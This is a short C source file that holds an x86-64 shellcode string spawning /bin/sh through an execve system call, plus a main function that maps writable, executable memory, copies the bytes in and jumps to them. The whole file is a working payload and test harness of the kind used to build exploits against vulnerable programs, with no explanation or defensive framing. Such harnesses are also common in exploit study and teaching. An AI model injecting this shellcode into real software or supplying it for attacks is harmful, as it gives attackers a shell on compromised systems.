char shellcode[] = "H1\300PH\272/bin//shRT_PTZH\215O\6QT^\260;\17\5";

#include <sys/mman.h>
#include <string.h>
int main() {
    int (*sc)() = mmap(NULL, 4096, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memcpy(sc, shellcode, sizeof(shellcode));
    return sc();
}
